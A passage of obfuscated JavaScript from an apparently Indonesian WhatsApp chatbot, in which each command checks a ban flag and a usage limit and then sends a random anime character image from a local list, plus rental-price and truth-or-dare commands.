            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x4cb1fe
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x22a): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                kosaki: _0x3d685c
            } = require(_0x5804c8(0x8ac));
            let _0x299836 = _0x3d685c[Math[_0x5804c8(0xa2b)](Math['random']() * _0x3d685c[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x299836
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x8a9): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                kotori: _0x408bdd
            } = require(_0x5804c8(0x5b1));
            let _0x4430cd = _0x408bdd[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x408bdd[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x4430cd
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x84e): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                kuriyama: _0x365ec9
            } = require('./datanya/anime/kuriyama');
            let _0x12528f = _0x365ec9[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x365ec9[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x12528f
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0xb5b): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                kuroha: _0x23b3ab
            } = require('./datanya/anime/kuroha');
            let _0x2ed51f = _0x23b3ab[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x23b3ab['length'])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x2ed51f
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'kurumi': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                kurumi: _0x3d28e2
            } = require(_0x5804c8(0xa86));
            let _0x4840e4 = _0x3d28e2[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x3d28e2[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x4840e4
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x430): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                loli: _0x50f813
            } = require(_0x5804c8(0x74c));
            let _0x76aaff = _0x50f813[Math[_0x5804c8(0xa2b)](Math['random']() * _0x50f813[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x76aaff
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x330): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                madara: _0x2595cc
            } = require(_0x5804c8(0x569));
            let _0xa3e70 = _0x2595cc[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x2595cc[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0xa3e70
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x7a5): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                megumin: _0x1bff10
            } = require(_0x5804c8(0xcc6));
            let _0x5774a6 = _0x1bff10[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x1bff10[_0x5804c8(0x977)])];
            _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x5774a6
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x347): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                menus: _0x4632ee
            } = require(_0x5804c8(0xca5));
            let _0x2cd7a8 = _0x4632ee[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x4632ee[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x2cd7a8
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'mikasa': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                mikasa: _0x4f71bd
            } = require(_0x5804c8(0x159));
            let _0x50a4ee = _0x4f71bd[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x4f71bd['length'])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x50a4ee
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'miku': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                miku: _0x305d1b
            } = require(_0x5804c8(0x788));
            let _0x22142d = _0x305d1b[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x305d1b['length'])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x22142d
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x708): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                minato: _0x9a9183
            } = require(_0x5804c8(0x4d4));
            let _0x357298 = _0x9a9183[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x9a9183[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x357298
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0xa9e): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                naruto: _0x4fc1e9
            } = require(_0x5804c8(0x590));
            let _0x1c9d0f = _0x4fc1e9[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x4fc1e9[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x1c9d0f
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x5ff): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                natsukawa: _0x3250a3
            } = require('./datanya/anime/natsukawa');
            let _0x508591 = _0x3250a3[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x3250a3['length'])];
            _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x508591
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x558): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                nezuko: _0x2efe0b
            } = require(_0x5804c8(0xd5e));
            let _0x56715b = _0x2efe0b[Math[_0x5804c8(0xa2b)](Math['random']() * _0x2efe0b[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x56715b
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'nishimiya': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                nishimiya: _0x54b296
            } = require(_0x5804c8(0x146));
            let _0x78f771 = _0x54b296[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x54b296[_0x5804c8(0x977)])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x78f771
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'onepiece': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                onepiece: _0x232e09
            } = require('./datanya/anime/onepiece');
            let _0x592adc = _0x232e09[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x232e09[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x592adc
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x883): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            const {
                pokemon: _0x35093a
            } = require('./datanya/anime/pokemon');
            let _0x4e9e5f = _0x35093a[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x35093a[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x4e9e5f
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x409): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                rem: _0x53d41a
            } = require(_0x5804c8(0xab2));
            let _0x1a66ab = _0x53d41a[Math[_0x5804c8(0xa2b)](Math['random']() * _0x53d41a['length'])];
            _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x1a66ab
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x16a): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                rize: _0x1474fe
            } = require(_0x5804c8(0x702));
            let _0x45f3db = _0x1474fe[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x1474fe[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x45f3db
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xd14): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                sagiri: _0x9aa5fb
            } = require(_0x5804c8(0x507));
            let _0xc29c9 = _0x9aa5fb[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x9aa5fb[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0xc29c9
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x182): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                sakura: _0x573d87
            } = require(_0x5804c8(0xcbe));
            let _0x2587ce = _0x573d87[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x573d87[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x2587ce
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x8b3): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                sasuke: _0x4b96c7
            } = require(_0x5804c8(0x95e));
            let _0x3b1f1c = _0x4b96c7[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x4b96c7[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x3b1f1c
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x1ec): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                shina: _0x4e7488
            } = require(_0x5804c8(0xb00));
            let _0x91888 = _0x4e7488[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x4e7488[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x91888
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x14e): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                shinka: _0x4cd439
            } = require(_0x5804c8(0xb4d));
            let _0x1c4a4b = _0x4cd439[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x4cd439['length'])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x1c4a4b
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x91a): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                shizuka: _0x1fcbb8
            } = require(_0x5804c8(0xc43));
            let _0x58daaf = _0x1fcbb8[Math[_0x5804c8(0xa2b)](Math['random']() * _0x1fcbb8[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x58daaf
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x80c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                shota: _0x4c5398
            } = require(_0x5804c8(0x9de));
            let _0x898324 = _0x4c5398[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x4c5398[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x898324
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x636): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                simp: _0x13b068
            } = require(_0x5804c8(0xa9b));
            let _0x459ab5 = _0x13b068[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x13b068[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x459ab5
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0xd47): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                tomori: _0x308b7a
            } = require(_0x5804c8(0x8aa));
            let _0x1b2722 = _0x308b7a[Math[_0x5804c8(0xa2b)](Math['random']() * _0x308b7a[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x1b2722
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'toukachan': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                toukachan: _0x3f0685
            } = require(_0x5804c8(0xbde));
            let _0x35d95e = _0x3f0685[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x3f0685[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x35d95e
                },
                'caption': 'Random ' + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'tsunade': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                tsunade: _0x204261
            } = require(_0x5804c8(0xd69));
            let _0x52e463 = _0x204261[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x204261[_0x5804c8(0x977)])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x52e463
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'yatogami': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                yatogami: _0x177134
            } = require(_0x5804c8(0xaaf));
            let _0x32f027 = _0x177134[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x177134['length'])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x32f027
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0xd90): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                yuki: _0x4946b3
            } = require(_0x5804c8(0x66f));
            let _0x4fa222 = _0x4946b3[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x4946b3['length'])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x4fa222
                },
                'caption': _0x5804c8(0x96c) + _0x453fc1
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x1f4):
        case 'daftarprem':
        case _0x5804c8(0x495):
        case 'price':
        case 'sewa': {
            const {
                sewanya: _0xa7d2f2
            } = require(_0x5804c8(0xd2e));
            _0x358f3b('' + _0xa7d2f2);
        }
        break;
        case _0x5804c8(0xb95): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                dare: _0x259a12
            } = require(_0x5804c8(0xc5e)), _0x3c7005 = _0x259a12[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x259a12[_0x5804c8(0x977)])];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x3c7005,
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0xaa6),
                        'body': '𝗞𝗮𝗺𝘂 𝗠𝗲𝗺𝗶𝗹𝗶𝗵 𝗗𝗮𝗿𝗲',
                        'thumbnailUrl': 'https://telegra.ph/file/91d612a8de859e4e47f30.jpg',
                        'sourceUrl': '',
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x51e31f
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0xc8d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            const {
                truth: _0x28c9a6
            } = require('./datanya/truth-dare/truth'), _0x17c99d = _0x28c9a6[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x28c9a6[_0x5804c8(0x977)])];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
